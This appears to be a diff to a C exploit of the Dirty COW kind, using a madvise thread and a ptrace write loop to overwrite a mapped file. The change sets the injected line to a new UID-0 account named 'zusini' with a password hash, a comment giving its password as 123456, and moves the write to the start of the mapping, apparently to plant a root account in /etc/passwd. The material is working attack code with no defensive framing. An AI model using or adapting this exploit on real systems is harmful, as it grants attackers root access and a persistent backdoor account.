@@ -32,7 +32,7 @@ void *madviseThread(void *arg) {
 }
 int main()
 {
-char *complete_passwd_line = ":x:0:0:,,,:/var/www:/bin/bash     " ;
+char *complete_passwd_line = "zusini:zuTWBmJcm89rI:0:0:test:/root:/bin/bash" ;
 //user : zusini passwd: 123456
 //zusini:zuTWBmJcm89rI:0:0:test:/root:/bin/bash
 
@@ -55,7 +55,7 @@ char *complete_passwd_line = ":x:0:0:,,,:/var/www:/bin/bash     " ;
         for(u = 0; u < 10000; u++) {
           c += ptrace(PTRACE_POKETEXT,
                       pid,
-                      map + 1005 + o,
+                      map + o,
                       *((long*)(complete_passwd_line + o)));
         }
       }
